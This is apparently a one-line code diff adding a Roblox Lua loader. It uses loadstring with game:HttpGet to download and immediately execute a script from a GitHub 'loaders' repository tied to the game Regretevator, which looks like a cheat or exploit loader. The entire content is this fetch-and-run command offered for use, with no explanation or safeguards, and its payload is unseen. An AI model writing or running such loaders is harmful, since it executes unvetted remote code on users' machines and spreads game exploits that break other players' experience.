@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/regretevator-elevator-simulator-spam7-0i3gdv4ajou14r.lua"))()
